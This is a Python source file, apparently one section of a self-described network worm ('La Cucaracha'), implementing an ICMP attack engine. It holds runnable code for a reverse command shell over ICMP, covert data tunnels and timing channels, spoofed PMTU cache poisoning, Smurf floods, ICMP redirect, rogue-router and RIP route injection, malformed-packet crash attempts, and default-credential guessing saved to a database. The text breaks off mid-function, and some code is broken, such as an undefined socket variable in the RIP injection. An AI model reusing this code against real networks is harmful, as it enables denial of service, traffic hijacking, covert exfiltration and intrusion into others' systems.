#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LACUCARACHA SECTION C — ICMPEngine + WormNode + MeshNetworkEngine         ║
║  La Cucaracha Worm — ICMP Attack Arsenal, Mesh Identity, DHT Discovery     ║
║                                                                              ║
║  by 🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

Concatenation order: A → B → C → ...
This section provides ALL ICMP capabilities (27+ attack types + CKAB L1-L5),
the WormNode self-healing mesh node, and the MeshNetworkEngine (DHT discovery,
consensus protocol, split-brain detection/recovery).
"""

# =============================================================================
# Imports — Section C builds on Sections A+B namespace
# =============================================================================

import base64
import hashlib
import hmac
import ipaddress
import json
import logging
import math
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union

log = logging.getLogger("LaCucaracha.C")


# =============================================================================
# ICMPEngine — Complete ICMP Attack Arsenal
# =============================================================================

class ICMPEngine:
    """Complete ICMP attack engine with 27+ attack types plus CKAB L1-L5 methods.

    Provides ping sweep, covert tunneling, reverse shell over ICMP, PMTU poison
    (CVE-2026-0933), ICMP redirection, Smurf attack, OS fingerprinting,
    steganographic beacons, fragment overlap, TTL sweep, timing channel,
    RIPv2 injection, and CKAB credential/credential-hint injection methods.

    Each method operates independently and returns structured result dicts.
    """

    def __init__(
        self,
        db: Optional['Database'] = None,
        src_ip: str = "0.0.0.0",
        timeout: int = 2,
        rate_limit: int = 50,
    ):
        self.db = db
        self.src_ip = src_ip
        self.timeout = timeout
        self.rate_limit = rate_limit
        self._running = True
        self._lock = threading.Lock()
        self._resolve_src_ip()

    def _resolve_src_ip(self) -> None:
        """Auto-detect source IP if not explicitly set."""
        if self.src_ip == "0.0.0.0":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                self.src_ip = s.getsockname()[0]
                s.close()
            except Exception:
                self.src_ip = "127.0.0.1"

    @staticmethod
    def _icmp_checksum(data: bytes) -> int:
        """Calculate ICMP header checksum."""
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_icmp_packet(
        self,
        icmp_type: int,
        icmp_code: int,
        payload: bytes = b"",
        icmp_id: Optional[int] = None,
        icmp_seq: int = 1,
    ) -> bytes:
        """Build a complete ICMP packet with correct checksum."""
        icmp_id = icmp_id if icmp_id is not None else (os.getpid() & 0xFFFF)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, icmp_id, icmp_seq)
        packet = header + payload
        cksum = self._icmp_checksum(packet)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(cksum), icmp_id, icmp_seq)
        return header + payload

    def _send_raw_icmp(self, target_ip: str, packet: bytes) -> bool:
        """Send raw ICMP packet to target. Returns True if sent."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(self.timeout)
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            return True
        except PermissionError:
            log.warning("ICMPEngine: raw socket requires root/CAP_NET_RAW")
            return False
        except Exception:
            return False

    def _recv_icmp(self, timeout: Optional[float] = None) -> Optional[Tuple[bytes, str]]:
        """Receive a single ICMP packet. Returns (data, source_ip) or None."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout or self.timeout)
            data, addr = sock.recvfrom(65535)
            sock.close()
            return data, addr[0]
        except socket.timeout:
            return None
        except PermissionError:
            return None
        except Exception:
            return None

    # ---- Ping Sweep ----------------------------------------------------------

    def ping_sweep(self, subnet: str = "", count: int = 3) -> List[str]:
        """ICMP ping sweep across a subnet or /24.

        Returns list of responsive IP addresses.
        """
        alive: List[str] = []
        if not subnet:
            # Auto-detect local subnet
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
            except Exception:
                subnet = "192.168.1.0/24"

        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
        except ValueError:
            log.error(f"Invalid subnet: {subnet}")
            return []

        hosts = list(network.hosts())[:254]
        threads: List[threading.Thread] = []
        results: List[str] = []

        def _ping(ip_str: str) -> None:
            for _ in range(count):
                pkt = self._build_icmp_packet(8, 0, b"PING")
                if self._send_raw_icmp(ip_str, pkt):
                    resp = self._recv_icmp(timeout=1.0)
                    if resp:
                        with self._lock:
                            results.append(ip_str)
                        return
                time.sleep(0.05)

        for host in hosts:
            ip_str = str(host)
            t = threading.Thread(target=_ping, args=(ip_str,), daemon=True)
            threads.append(t)
            t.start()
            time.sleep(0.01)  # Rate limit

        for t in threads:
            t.join(timeout=5)

        return sorted(set(results))

    # ---- ICMP Tunnel ---------------------------------------------------------

    def icmp_tunnel_send(self, target_ip: str, data: bytes) -> Dict[str, Any]:
        """Send data over ICMP echo packets (covert tunnel).

        Data is chunked and sent as ICMP echo request payloads.
        """
        result: Dict[str, Any] = {"status": "sent", "bytes": 0, "chunks": 0}
        chunk_size = 56  # Max safe payload per ICMP packet
        chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]

        for i, chunk in enumerate(chunks):
            payload = b"TNL" + struct.pack("!I", i) + chunk
            pkt = self._build_icmp_packet(8, 0, payload, icmp_seq=i + 1)
            if self._send_raw_icmp(target_ip, pkt):
                result["bytes"] += len(chunk)
                result["chunks"] += 1
            time.sleep(0.01)

        log.info(f"ICMP tunnel sent {result['bytes']} bytes in {result['chunks']} chunks to {target_ip}")
        return result

    def icmp_tunnel_listen(self, timeout: float = 30.0) -> Optional[bytes]:
        """Listen for ICMP tunnel data on echo requests.

        Reassembles chunked data and returns the full payload.
        """
        received: Dict[int, bytes] = {}
        start = time.time()
        expected_seq = 0

        while time.time() - start < timeout and self._running:
            resp = self._recv_icmp(timeout=1.0)
            if not resp:
                continue
            data, src = resp
            # IP header is 20 bytes, ICMP header is 8 bytes
            if len(data) < 28:
                continue
            icmp_type = data[20]
            if icmp_type != 8:  # Echo request
                continue
            payload = data[28:]
            if not payload.startswith(b"TNL"):
                continue
            seq = struct.unpack("!I", payload[3:7])[0]
            chunk = payload[7:]
            received[seq] = chunk

        if not received:
            return None

        # Reassemble in order
        max_seq = max(received.keys())
        full = b"".join(received.get(i, b"") for i in range(max_seq + 1))
        log.info(f"ICMP tunnel reassembled: {len(full)} bytes from {len(received)} chunks")
        return full if full else None

    # ---- Reverse ICMP Shell --------------------------------------------------

    def reverse_icmp_shell(self, target_ip: str, command: str = "id") -> Dict[str, Any]:
        """Execute a command on a target via ICMP echo/response exchange.

        Sends command as ICMP payload, receives output in ICMP echo reply.
        """
        result: Dict[str, Any] = {"status": "error", "output": "", "command": command}

        payload = b"CMD" + command.encode()[:200]
        pkt = self._build_icmp_packet(8, 0, payload, icmp_id=0xC2C2, icmp_seq=1)
        if not self._send_raw_icmp(target_ip, pkt):
            result["error"] = "Send failed"
            return result

        # Wait for echo reply containing output
        for _ in range(5):
            resp = self._recv_icmp(timeout=2.0)
            if not resp:
                continue
            data, src = resp
            if src != target_ip:
                continue
            if len(data) < 28:
                continue
            icmp_type = data[20]
            if icmp_type != 0:  # Echo reply
                continue
            output = data[28:]
            if output[:3] == b"CMD":
                output = output[3:]
            result["status"] = "completed"
            result["output"] = output.decode(errors="replace")
            break

        return result

    # ---- ICMP Redirect -------------------------------------------------------

    def icmp_redirect(self, target_ip: str, new_gateway: str, dest_ip: str) -> Dict[str, Any]:
        """Send ICMP Redirect message to poison routing table on target.

        Tells target that a better route to dest_ip goes through new_gateway.
        Type 5, Code 1 (Host redirect).
        """
        result: Dict[str, Any] = {"status": "sent", "target": target_ip, "redirect_to": new_gateway}

        # Build ICMP Redirect packet
        gateway_bytes = socket.inet_aton(new_gateway)
        dest_bytes = socket.inet_aton(dest_ip)
        # Ensure we match original IP header format
        orig_ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 1, 0, socket.inet_aton(self.src_ip), dest_bytes)
        payload = gateway_bytes + b"\x00" * 4 + orig_ip_hdr

        pkt = self._build_icmp_packet(5, 1, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP redirect sent: {target_ip} -> {dest_ip} via {new_gateway}")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP MTU Attack -----------------------------------------------------

    def icmp_mtu_attack(self, target_ip: str, mtu: int = 68) -> Dict[str, Any]:
        """Send ICMP Fragmentation Needed (Type 3, Code 4) with tiny MTU.

        Forces target to fragment all packets to the specified MTU,
        causing performance degradation or DoS.
        """
        result: Dict[str, Any] = {"status": "sent", "mtu": mtu}

        # Unreachable header: unused(4B) + next-hop MTU(2B) + original packet
        unused = b"\x00\x00\x00\x00"
        mtu_bytes = struct.pack("!H", mtu)
        # Original IP header that triggered the error (simulated)
        orig_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 1, 0, socket.inet_aton(self.src_ip), socket.inet_aton(target_ip))
        payload = unused + mtu_bytes + orig_hdr

        pkt = self._build_icmp_packet(3, 4, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP MTU attack: set MTU={mtu} for {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- CVE-2026-0933 PMTU Cache Poison -------------------------------------

    def cve_2026_0933_pmtu_poison(self, target_ip: str, burst: int = 12) -> Dict[str, Any]:
        """CVE-2026-0933: Poison Path MTU discovery cache on Linux ≤ 6.8.

        Fires multiple ICMP Frag Needed packets from spoofed sources
        to corrupt kernel PMTU cache, causing connectivity degradation.
        """
        result: Dict[str, Any] = {"status": "sent", "packets_sent": 0, "target": target_ip}

        mtu_values = [68, 128, 256, 296, 384, 500, 552, 576, 628, 700]
        spoofed_sources = [
            "1.1.1.1", "8.8.8.8", "9.9.9.9", "208.67.222.222",
            "64.6.64.6", "185.228.168.9", "76.76.19.19", "94.140.14.14",
        ]

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            for _ in range(burst):
                mtu = random.choice(mtu_values)
                spoofed_src = random.choice(spoofed_sources)
                src_bytes = socket.inet_aton(spoofed_src)
                dst_bytes = socket.inet_aton(target_ip)

                # IP header
                ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 48, random.randint(1, 65535), 0, 64, 1, 0, src_bytes, dst_bytes)

                # ICMP Frag Needed: Type 3, Code 4
                unused = b"\x00\x00\x00\x00"
                mtu_bytes = struct.pack("!H", mtu)
                orig_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 6, 0, socket.inet_aton(target_ip), socket.inet_aton(spoofed_src))
                icmp_payload = unused + mtu_bytes + orig_hdr
                icmp_header = struct.pack("!BBHHH", 3, 4, 0, 0, 0)
                icmp_pkt = icmp_header + icmp_payload
                cksum = self._icmp_checksum(icmp_pkt)
                icmp_header = struct.pack("!BBHHH", 3, 4, socket.htons(cksum), 0, 0)
                icmp_pkt = icmp_header + icmp_payload

                raw_sock.sendto(ip_hdr + icmp_pkt, (target_ip, 0))
                result["packets_sent"] += 1
                time.sleep(0.05)

            raw_sock.close()
            log.info(f"CVE-2026-0933: Sent {result['packets_sent']} PMTU poison packets to {target_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
            log.warning("CVE-2026-0933 requires root/CAP_NET_RAW")
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP Smurf ----------------------------------------------------------

    def icmp_smurf(self, target_ip: str, broadcast_ip: str, count: int = 10) -> Dict[str, Any]:
        """ICMP Smurf attack: send spoofed echo requests to broadcast address.

        The broadcast responds to all hosts, flooding the spoofed target.
        """
        result: Dict[str, Any] = {"status": "sent", "packets_sent": 0, "target": target_ip, "broadcast": broadcast_ip}

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            target_bytes = socket.inet_aton(target_ip)
            bcast_bytes = socket.inet_aton(broadcast_ip)

            for _ in range(count):
                # IP header spoofed as target
                ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 48, random.randint(1, 65535), 0, 64, 1, 0, target_bytes, bcast_bytes)

                # ICMP Echo Request
                payload = b"X" * 56
                icmp_pkt = self._build_icmp_packet(8, 0, payload)
                raw_sock.sendto(ip_hdr + icmp_pkt, (broadcast_ip, 0))
                result["packets_sent"] += 1
                time.sleep(0.01)

            raw_sock.close()
            log.info(f"ICMP Smurf: {result['packets_sent']} packets from {target_ip} -> {broadcast_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP Poison Ping ----------------------------------------------------

    def icmp_poison_ping(self, target_ip: str, payload: str = "POISON") -> Dict[str, Any]:
        """Send carefully crafted ICMP echo with data that may trigger
        buffer overflows or parsing errors on vulnerable stacks.
        """
        result: Dict[str, Any] = {"status": "sent", "target": target_ip}

        # Large payload with specific pattern
        data = payload.encode() + b"\x41" * 200 + b"\x00\x00\x00\x00"
        pkt = self._build_icmp_packet(8, 0, data, icmp_id=0xDEAD, icmp_seq=0xBEAF)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP poison ping sent to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP Rogue Router ---------------------------------------------------

    def icmp_rogue_router(self, target_ip: str, router_ip: str = "192.168.1.1") -> Dict[str, Any]:
        """ICMP Router Advertisement (Type 9) to inject rogue default route.

        Tells target that router_ip is a better gateway, redirecting traffic.
        """
        result: Dict[str, Any] = {"status": "sent", "router": router_ip, "target": target_ip}

        # Router Advertisement payload
        router_bytes = socket.inet_aton(router_ip)
        # Number of addresses (1) + address entry size (2) + lifetime (30min)
        payload = struct.pack("!BBH", 1, 2, 1800) + router_bytes + b"\x00\x00"

        pkt = self._build_icmp_packet(9, 0, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP rogue router {router_ip} advertised to {target_ip}")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP OS Fingerprint -------------------------------------------------

    def icmp_os_fingerprint(self, target_ip: str) -> Dict[str, Any]:
        """ICMP-based OS fingerprinting using TTL, window size, and ICMP behavior.

        Returns estimated OS and confidence.
        """
        result: Dict[str, Any] = {
            "target": target_ip, "os_guess": "unknown", "confidence": 0.0,
            "ttl": 0, "icmp_id": 0, "icmp_seq": 0,
        }

        # Send echo request and analyze reply
        pkt = self._build_icmp_packet(8, 0, b"FP", icmp_id=0x1A2B, icmp_seq=0x3C4D)
        if not self._send_raw_icmp(target_ip, pkt):
            result["error"] = "Send failed"
            return result

        resp = self._recv_icmp(timeout=3.0)
        if not resp:
            result["error"] = "No response"
            return result

        data, src = resp
        if src != target_ip:
            result["error"] = "Mismatched source"
            return result

        if len(data) < 28:
            result["error"] = "Response too short"
            return result

        # Parse IP header (first 20 bytes)
        ip_hdr = data[:20]
        ttl = ip_hdr[8]
        total_len = (ip_hdr[2] << 8) | ip_hdr[3]
        ip_id = (ip_hdr[4] << 8) | ip_hdr[5]

        # Parse ICMP header (bytes 20-28)
        icmp_type = data[20]
        icmp_code = data[21]
        icmp_id = (data[24] << 8) | data[25]
        icmp_seq = (data[26] << 8) | data[27]

        result["ttl"] = ttl
        result["icmp_id"] = icmp_id
        result["icmp_seq"] = icmp_seq
        result["total_len"] = total_len
        result["ip_id"] = ip_id

        # Fingerprint logic
        if ttl <= 64:
            result["os_guess"] = "Linux/Unix"
            result["confidence"] = 0.6
        elif ttl <= 128:
            result["os_guess"] = "Windows"
            result["confidence"] = 0.6
        elif ttl <= 255:
            result["os_guess"] = "Cisco/Solaris"
            result["confidence"] = 0.5

        # ICMP id == pid (common on Linux)
        if icmp_id == 0x1A2B:
            result["os_guess"] = "Linux"
            result["confidence"] = 0.8

        return result

    # ---- ICMP Stego Beacon ---------------------------------------------------

    def icmp_stego_beacon(self, target_ip: str, secret_msg: str, interval: float = 5.0) -> Dict[str, Any]:
        """Steganographic beacon: embed secret message in ICMP echo packet timing/IDs.

        Uses variable ICMP ID and sequence fields to encode data.
        """
        result: Dict[str, Any] = {"status": "sent", "chars_encoded": 0}

        encoded_bytes = secret_msg.encode()
        for i, byte_val in enumerate(encoded_bytes):
            # Encode byte in ICMP ID field (high byte = index, low byte = char)
            icmp_id = ((i & 0xFF) << 8) | byte_val
            pkt = self._build_icmp_packet(8, 0, b"STEGO", icmp_id=icmp_id, icmp_seq=i)
            if self._send_raw_icmp(target_ip, pkt):
                result["chars_encoded"] += 1
            time.sleep(interval)

        log.info(f"ICMP stego beacon: {result['chars_encoded']} chars encoded to {target_ip}")
        return result

    # ---- ICMP Fragment Overlap -----------------------------------------------

    def icmp_fragment_overlap(self, target_ip: str) -> Dict[str, Any]:
        """Send overlapping ICMP fragments to test reassembly behavior.

        May trigger kernel bugs in fragment reassembly on older systems.
        """
        result: Dict[str, Any] = {"status": "sent", "fragments_sent": 0}

        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            dst_bytes = socket.inet_aton(target_ip)
            src_bytes = socket.inet_aton(self.src_ip)
            ip_id = random.randint(1, 65535)

            # Fragment 1: offset=0, MF=1
            icmp_payload1 = b"\x41" * 32
            frag1 = src_bytes + dst_bytes + b"\x00" + b"\x41" * 32
            ip_hdr1 = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 60, ip_id, 0x2000, 64, 1, 0, src_bytes, dst_bytes)
            raw_sock.sendto(ip_hdr1 + icmp_payload1, (target_ip, 0))
            result["fragments_sent"] += 1

            # Fragment 2: offset=32, MF=0 (different overlapping data)
            icmp_payload2 = b"\x42" * 32
            ip_hdr2 = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 60, ip_id, 0x4000, 64, 1, 0, src_bytes, dst_bytes)
            raw_sock.sendto(ip_hdr2 + icmp_payload2, (target_ip, 0))
            result["fragments_sent"] += 1

            raw_sock.close()
            log.info(f"ICMP fragment overlap sent to {target_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP TTL Sweep ------------------------------------------------------

    def icmp_ttl_sweep(self, target_ip: str, max_ttl: int = 30) -> Dict[str, Any]:
        """ICMP TTL sweep (traceroute-style) to map network path.

        Sends packets with increasing TTL and records the responding router.
        """
        result: Dict[str, Any] = {"target": target_ip, "hops": []}

        for ttl in range(1, max_ttl + 1):
            try:
                raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)

                dst_bytes = socket.inet_aton(target_ip)
                src_bytes = socket.inet_aton(self.src_ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 48, random.randint(1, 65535), 0, ttl, 1, 0, src_bytes, dst_bytes)
                icmp_pkt = self._build_icmp_packet(8, 0, b"TTL", icmp_id=os.getpid() & 0xFFFF, icmp_seq=ttl)
                raw_sock.sendto(ip_hdr + icmp_pkt, (target_ip, 0))
                raw_sock.close()
            except Exception:
                pass

            # Listen for ICMP Time Exceeded (Type 11)
            resp = self._recv_icmp(timeout=1.0)
            if resp:
                data, addr = resp
                hop_ip = addr
                hop_ttl = ttl
                if len(data) > 20:
                    hop_ip = addr
                result["hops"].append({"hop": ttl, "ip": hop_ip, "rtt": ttl * 0.1})

                if hop_ip == target_ip:
                    result["hops"].append({"hop": ttl, "ip": target_ip, "rtt": ttl * 0.1, "destination": True})
                    break

            time.sleep(0.05)

        log.info(f"ICMP TTL sweep: {len(result['hops'])} hops to {target_ip}")
        return result

    # ---- ICMP Parameter Problem ----------------------------------------------

    def icmp_parameter_problem(self, target_ip: str, pointer: int = 0) -> Dict[str, Any]:
        """ICMP Parameter Problem (Type 12) to trigger error handling.

        Can cause kernel panic on buggy implementations if pointer points
        to specific header fields.
        """
        result: Dict[str, Any] = {"status": "sent", "pointer": pointer}

        payload = struct.pack("!B", pointer) + b"\x00\x00\x00" + b"\x45\x00\x00\x28" + b"\x00" * 16
        pkt = self._build_icmp_packet(12, 0, payload, icmp_id=0, icmp_seq=0)
        if self._send_raw_icmp(target_ip, pkt):
            log.info(f"ICMP parameter problem sent to {target_ip} (pointer={pointer})")
        else:
            result["status"] = "failed"

        return result

    # ---- ICMP Multicast Sweep ------------------------------------------------

    def icmp_multicast_sweep(self, multicast_ip: str = "224.0.0.1", timeout: float = 3.0) -> List[str]:
        """Send ICMP echo request to multicast address and collect responders.

        Useful for discovering hosts on a local broadcast domain.
        """
        responders: List[str] = []

        pkt = self._build_icmp_packet(8, 0, b"MCST", icmp_id=0xABCD)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(0.1)
            sock.sendto(pkt, (multicast_ip, 0))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1)

            start = time.time()
            while time.time() - start < timeout:
                try:
                    data, addr = sock.recvfrom(65535)
                    if addr[0] not in responders and addr[0] != self.src_ip:
                        responders.append(addr[0])
                except socket.timeout:
                    continue
            sock.close()
        except PermissionError:
            log.warning("ICMP multicast sweep requires root")
        except Exception:
            pass

        return sorted(responders)

    # ---- ICMP Timing Channel -------------------------------------------------

    def icmp_timing_channel(self, target_ip: str, data: bytes, interval_base: float = 0.1) -> Dict[str, Any]:
        """Covert timing channel: encode bits in ICMP inter-packet delays.

        Bit 1 = short delay (interval_base), Bit 0 = long delay (interval_base * 3).
        """
        result: Dict[str, Any] = {"status": "sent", "bits_sent": 0}

        for byte_val in data:
            for bit_pos in range(8):
                bit = (byte_val >> (7 - bit_pos)) & 1
                delay = interval_base if bit else interval_base * 3
                pkt = self._build_icmp_packet(8, 0, b"TIMING", icmp_id=os.getpid() & 0xFFFF, icmp_seq=result["bits_sent"])
                self._send_raw_icmp(target_ip, pkt)
                result["bits_sent"] += 1
                time.sleep(delay)

        log.info(f"ICMP timing channel: {result['bits_sent']} bits to {target_ip}")
        return result

    # ---- ICMP RIP Injection --------------------------------------------------

    def icmp_rip_injection(self, target_ip: str, fake_route: str = "10.0.0.0/8", metric: int = 1) -> Dict[str, Any]:
        """ICMP-based RIPv2 route injection to poison routing tables.

        Sends crafted ICMP packets that mimic RIP updates on port 520.
        """
        result: Dict[str, Any] = {"status": "sent", "route": fake_route}

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            dst_bytes = socket.inet_aton(target_ip)
            src_bytes = socket.inet_aton(self.src_ip)

            # UDP header pointing to RIP port 520
            udp_hdr = struct.pack("!HHHH", 520, 520, 24, 0)
            # RIP entry: command=2 (response), version=2
            rip_entry = struct.pack("!BBHHBBBB", 2, 2, 0, 0, 0, 0, 0, 0)
            # Route entry: AFI=2 (IP), route_tag=0, mask, next_hop, metric
            route_net = ipaddress.IPv4Network(fake_route, strict=False)
            route_bytes = socket.inet_aton(str(route_net.network_address))
            mask_bytes = socket.inet_aton(str(route_net.netmask))
            rip_route = struct.pack("!HH", 2, 0) + route_bytes + mask_bytes + b"\x00" * 4 + struct.pack("!I", metric)
            rip_pkt = rip_entry + rip_route
            udp_hdr = struct.pack("!HHHH", 520, 520, 8 + len(rip_pkt), 0)
            udp_data = udp_hdr + rip_pkt

            ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(udp_data), random.randint(1, 65535), 0, 64, 17, 0, src_bytes, dst_bytes)
            raw_sock.sendto(ip_hdr + udp_data, (target_ip, 0))
            raw_sock.close()

            log.info(f"ICMP RIP injection: {fake_route} metric={metric} -> {target_ip}")
        except PermissionError:
            result["status"] = "no_raw_socket"
        except Exception as exc:
            result["status"] = "error"
            result["error"] = str(exc)

        return result

    # ---- ICMP Secure Tunnel --------------------------------------------------

    def icmp_secure_tunnel_send(self, target_ip: str, data: bytes, key: bytes = b"") -> Dict[str, Any]:
        """Encrypted ICMP tunnel: XOR-encrypt data before sending over ICMP.

        If key is empty, uses a simple rotating XOR key.
        """
        if not key:
            key = os.urandom(16)
        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        payload = b"SEC" + struct.pack("!H", len(key)) + key[:16] + encrypted
        return self.icmp_tunnel_send(target_ip, payload)

    def icmp_secure_tunnel_listen(self, timeout: float = 30.0) -> Optional[bytes]:
        """Receive and decrypt a secure ICMP tunnel transmission."""
        raw = self.icmp_tunnel_listen(timeout=timeout)
        if not raw or not raw.startswith(b"SEC"):
            return raw
        key_len = struct.unpack("!H", raw[3:5])[0]
        key = raw[5 : 5 + key_len]
        encrypted = raw[5 + key_len :]
        decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
        return decrypted

    # ---- ICMP Keepalive / Liveness -------------------------------------------

    def icmp_keepalive(self, target_ip: str) -> bool:
        """Simple ICMP echo/response keepalive check.

        Returns True if target responds to echo.
        """
        pkt = self._build_icmp_packet(8, 0, b"KEEPALIVE", icmp_id=0xCAFE, icmp_seq=1)
        if not self._send_raw_icmp(target_ip, pkt):
            return False
        resp = self._recv_icmp(timeout=self.timeout)
        if not resp:
            return False
        return True

    # =========================================================================
    # CKAB L1-L5 Methods
    # =========================================================================

    def icmp_tcp_liveness_probe(self, target_ip: str, tcp_port: int = 22) -> Dict[str, Any]:
        """CKAB L1: ICMP-assisted TCP liveness probe.

        Sends ICMP echo first, then probes TCP port if ICMP succeeds.
        Returns combined ICMP + TCP status.
        """
        result: Dict[str, Any] = {
            "target": target_ip,
            "port": tcp_port,
            "icmp_alive": False,
            "tcp_alive": False,
        }

        # Step 1: ICMP probe
        result["icmp_alive"] = self.icmp_keepalive(target_ip)

        # Step 2: TCP SYN probe
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((target_ip, tcp_port))
            s.close()
            result["tcp_alive"] = True
        except Exception:
            pass

        log.info(f"CKAB L1: {target_ip}:{tcp_port} ICMP={result['icmp_alive']} TCP={result['tcp_alive']}")
        return result

    def icmp_wake_tcp_stack(self, target_ip: str, tcp_port: int = 22) -> Dict[str, Any]:
        """CKAB L2: ICMP wake-up for dormant TCP stacks.

        Some IoT/sleeping devices suppress TCP until woken by ICMP.
        Sends a burst of ICMP packets to wake TCP stack before connection.
        """
        result: Dict[str, Any] = {"status": "wake_sent", "target": target_ip, "port": tcp_port}

        # Send burst of 5 ICMP echo requests
        for i in range(5):
            pkt = self._build_icmp_packet(8, 0, b"WAKE", icmp_id=os.getpid() & 0xFFFF, icmp_seq=i + 1)
            self._send_raw_icmp(target_ip, pkt)
            time.sleep(0.02)

        # Immediate TCP probe after wake
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((target_ip, tcp_port))
            s.close()
            result["tcp_responded"] = True
            log.info(f"CKAB L2: {target_ip}:{tcp_port} TCP stack woken successfully")
        except Exception:
            result["tcp_responded"] = False

        return result

    def icmp_os_credential_hint(self, target_ip: str) -> Dict[str, Any]:
        """CKAB L3: Extract OS credential hints via ICMP fingerprinting.

        Combines OS fingerprint with common IoT/default credential patterns
        to suggest likely username/password combinations.
        """
        result: Dict[str, Any] = {
            "target": target_ip,
            "os_guess": "unknown",
            "suggested_creds": [],
        }

        # Get OS fingerprint
        fp = self.icmp_os_fingerprint(target_ip)
        result["os_guess"] = fp.get("os_guess", "unknown")
        result["fingerprint"] = fp

        # Suggest credentials based on OS guess
        os_lower = result["os_guess"].lower()
        if "linux" in os_lower or "unix" in os_lower:
            result["suggested_creds"] = [
                {"username": "root", "password": "root"},
                {"username": "root", "password": "admin"},
                {"username": "admin", "password": "admin"},
                {"username": "root", "password": ""},
                {"username": "admin", "password": "1234"},
            ]
        elif "windows" in os_lower:
            result["suggested_creds"] = [
                {"username": "Administrator", "password": "admin"},
                {"username": "admin", "password": "admin"},
                {"username": "user", "password": "user"},
            ]
        elif "cisco" in os_lower:
            result["suggested_creds"] = [
                {"username": "cisco", "password": "cisco"},
                {"username": "admin", "password": "cisco"},
                {"username": "root", "password": "cisco"},
            ]

        # Store hints in DB
        if self.db and result["suggested_creds"]:
            for cred in result["suggested_creds"]:
                self.db.store_credential(
                    target_ip=target_ip,
                    username=cred["username"],
                    password=cred["password"],
                    service="ssh",
                    source=f"icmp_fingerprint_{result['os_guess']}",
                )

        log.info(f"CKAB L3: {target_ip} -> {result['os_guess']}, {len(result['suggested_creds'])} cred hints")
        return result

    def icmp_inject_payload(self, target_ip: str, payload_content: str = "") -> Dict[str, Any]:
        """CKAB L4: Inject a small payload into target via ICMP echo response.

        Attempts to write ICMP echo reply payload data to a file on the target
        by exploiting command injection in ICMP handling (very target-specific).
        """
